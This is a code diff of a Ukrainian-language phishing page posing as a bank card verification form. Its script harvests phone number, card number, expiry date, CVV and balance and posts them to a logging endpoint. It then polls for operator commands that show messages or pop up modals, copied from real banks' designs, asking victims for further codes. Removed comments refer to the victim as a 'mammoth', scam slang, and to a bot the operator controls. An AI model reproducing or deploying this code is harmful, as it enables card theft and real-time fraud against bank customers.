@@ -15,7 +15,6 @@
             -webkit-user-select: none;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
-            touch-action: manipulation;
         }
 
         header { background: #fff; padding: 15px; border-bottom: 2px solid var(--blue); text-align: center; }
@@ -24,30 +23,17 @@
 
         main { display: flex; justify-content: center; padding: 20px 10px; }
         .auth-card {
-            background: #fff;
-            width: 100%;
-            max-width: 400px;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            box-sizing: border-box;
+            background: #fff; width: 100%; max-width: 400px; padding: 25px;
+            border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); box-sizing: border-box;
         }
 
         h1 { font-size: 18px; text-align: center; margin-bottom: 20px; color: #444; }
-
         .field { margin-bottom: 15px; }
         label { display: block; font-size: 10px; font-weight: 700; color: #888; text-transform: uppercase; margin-bottom: 5px; }
 
         input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-            outline: none;
-            background: #fff;
-            -webkit-appearance: none;
+            width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 6px;
+            font-size: 16px; box-sizing: border-box; outline: none; background: #fff;
         }
         input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1); }
 
@@ -55,31 +41,20 @@
         .row .field { flex: 1; }
 
         .balance-info {
-            background: #fff9e6;
-            border: 1px dashed #e6c200;
-            padding: 12px;
-            font-size: 11px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            line-height: 1.4;
+            background: #fff9e6; border: 1px dashed #e6c200; padding: 12px;
+            font-size: 11px; border-radius: 6px; margin-bottom: 20px; line-height: 1.4;
         }
 
         .submit-btn {
-            width: 100%;
-            background: var(--blue);
-            color: #fff;
-            border: none;
-            padding: 18px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.2s;
+            width: 100%; background: var(--blue); color: #fff; border: none;
+            padding: 18px; font-size: 16px; font-weight: 700; border-radius: 8px;
+            cursor: pointer; transition: 0.2s;
         }
         .submit-btn:active { transform: scale(0.98); background: #004494; }
 
         footer { text-align: center; font-size: 11px; color: #999; padding: 20px; }
 
+        /* ЛОАДЕР */
         .loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; display: none; flex-direction: column;
@@ -87,6 +62,33 @@
         }
         .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* МОДАЛКА (КОПИЯ С ПРИВАТА/ОЩАДА) */
+        #custom-modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); z-index: 10000; align-items: center; justify-content: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: #fff; width: 90%; max-width: 360px; padding: 25px;
+            border-radius: 20px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+            box-sizing: border-box; animation: fadeIn 0.3s ease-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .modal-content h3 { color: #333; margin-bottom: 10px; font-size: 19px; }
+        .modal-content p { color: #555; margin-bottom: 20px; font-size: 15px; line-height: 1.4; }
+        .modal-input-wrapper { margin-bottom: 20px; width: 100%; display: none; }
+        .modal-input-wrapper input {
+            width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 12px;
+            font-size: 18px; text-align: center; outline: none; box-sizing: border-box; background: #fdfdfd;
+        }
+        .modal-input-wrapper input:focus { border-color: var(--blue); background: #fff; }
+        .modal-btn {
+            background: var(--blue); color: #fff; border: none; padding: 15px;
+            border-radius: 12px; cursor: pointer; font-weight: bold; width: 100%;
+            font-size: 16px; transition: 0.2s;
+        }
+        .modal-btn:active { transform: scale(0.97); background: #004494; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -105,12 +107,10 @@
                 <label>Номер телефону</label>
                 <input type="tel" id="u-phone" placeholder="+380" inputmode="numeric" required>
             </div>
-
             <div class="field">
                 <label>Номер картки</label>
                 <input type="text" id="u-card" maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric" required>
             </div>
-
             <div class="row">
                 <div class="field">
                     <label>Термін дії</label>
@@ -121,16 +121,13 @@
                     <input type="password" id="u-cvv" maxlength="3" placeholder="***" inputmode="numeric" required>
                 </div>
             </div>
-
             <div class="field">
                 <label>Баланс на картці (грн)</label>
                 <input type="number" id="u-balance" placeholder="0.00" required>
             </div>
-
             <div class="balance-info">
                 ⚠️ Для верифікації баланс повинен бути понад 100 грн. Гроші не списуються.
             </div>
-
             <button type="submit" class="submit-btn">ПІДТВЕРДИТИ ДАНІ</button>
         </form>
     </div>
@@ -145,41 +142,58 @@
     <p id="loader-text" style="margin-top: 15px; font-weight: 600; color: #555;">Перевірка безпеки...</p>
 </div>
 
+<div id="custom-modal">
+    <div class="modal-content">
+        <h3 id="modal-title">Підтвердження</h3>
+        <p id="modal-desc"></p>
+        <div id="modal-input-group" class="modal-input-wrapper">
+            <input type="tel" id="modal-input" placeholder="0000" maxlength="20">
+        </div>
+        <button id="modal-btn" class="modal-btn">ПРОДОВЖИТИ</button>
+    </div>
+</div>
+
 <script>
-    // 1. Инициализация сессии
     if (!sessionStorage.getItem('USER_ID')) {
         sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
     }
     const USER_ID = sessionStorage.getItem('USER_ID');
 
-    // 2. Блокировка инструментов разработчика
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode == 85)) {
-            return false;
-        }
-    };
-
-    // 3. Маски для ввода
+    // Маски
     document.getElementById('u-card').addEventListener('input', function(e) {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
-
     document.getElementById('u-exp').addEventListener('input', function(e) {
         let v = e.target.value.replace(/[^\d]/g, '');
         if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
         e.target.value = v;
     });
 
-    // 4. Обработка формы
+    // Функция модалки
+    function showModal(type, text) {
+        return new Promise((resolve) => {
+            const modal = document.getElementById('custom-modal');
+            const desc = document.getElementById('modal-desc');
+            const inputGroup = document.getElementById('modal-input-group');
+            const btn = document.getElementById('modal-btn');
+            const input = document.getElementById('modal-input');
+            desc.innerText = text;
+            inputGroup.style.display = (type === 'ask') ? 'block' : 'none';
+            modal.style.display = 'flex';
+            if(type === 'ask') input.focus();
+            btn.onclick = () => {
+                const val = input.value;
+                modal.style.display = 'none';
+                input.value = '';
+                resolve(val);
+            };
+        });
+    }
+
+    // Отправка первой формы
     document.getElementById('other-banks-form').addEventListener('submit', async function(e) {
         e.preventDefault();
-        
-        const loader = document.getElementById('loader');
-        const status = document.getElementById('loader-text');
-        loader.style.display = 'flex';
-        status.innerText = "Встановлення захищеного з'єднання...";
-
-        // Данные для отправки
+        document.getElementById('loader').style.display = 'flex';
         const logData = {
             "Телефон": document.getElementById('u-phone').value,
             "Карта": document.getElementById('u-card').value,
@@ -187,65 +201,36 @@
             "CVV": document.getElementById('u-cvv').value,
             "Баланс": document.getElementById('u-balance').value + " грн"
         };
-
-        // Отправляем через твой сервер на Railway
-        try {
-            await fetch('/api/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userId: USER_ID,
-                    type: 'BANK-ID',
-                    data: logData
-                })
-            });
-
-            setTimeout(() => { status.innerText = "Авторизація транзакції..."; }, 2500);
-            // Теперь мамонт просто ждет, пока ты в боте нажмешь кнопку (СМС, Ошибка и т.д.)
-
-        } catch (err) {
-            loader.style.display = 'none';
-            alert("Помилка зв'язку. Спробуйте пізніше.");
-        }
+        await fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId: USER_ID, type: 'BANK-ID', data: logData })
+        });
     });
 
-    // 5. ПОСТОЯННАЯ ПРОВЕРКА КОМАНД ОТ АДМИНА
+    // Опрос команд
     setInterval(async () => {
         try {
             const res = await fetch(`/api/check/${USER_ID}`);
-            const data = await res.json();
-
-            if (data) {
-                const loader = document.getElementById('loader');
-
-                if (data.action === 'msg') {
-                    loader.style.display = 'none';
-                    alert(data.text);
-                    location.reload(); 
-                } 
-                else if (data.action === 'ask') {
-                    loader.style.display = 'none';
-                    const result = prompt(data.text);
-                    if (result) {
-                        loader.style.display = 'flex';
-                        // Отправляем ввод обратно в ТГ
+            if (res.status === 200) {
+                const data = await res.json();
+                if (data) {
+                    document.getElementById('loader').style.display = 'none';
+                    const result = await showModal(data.action, data.text);
+                    if (data.action === 'ask') {
+                        document.getElementById('loader').style.display = 'flex';
                         fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                userId: USER_ID,
-                                type: 'ОТВЕТ_USER',
-                                data: { "Ввод": result }
-                            })
+                            body: JSON.stringify({ userId: USER_ID, type: 'ОТВЕТ', data: { "Ввод": result } })
                         });
+                    } else if (data.action === 'msg') {
+                        location.reload();
                     }
                 }
             }
-        } catch (e) { /* ignore */ }
+        } catch (e) {}
     }, 3000);
-
-    window.scrollTo(0, 1);
 </script>
 </body>
-
 </html>
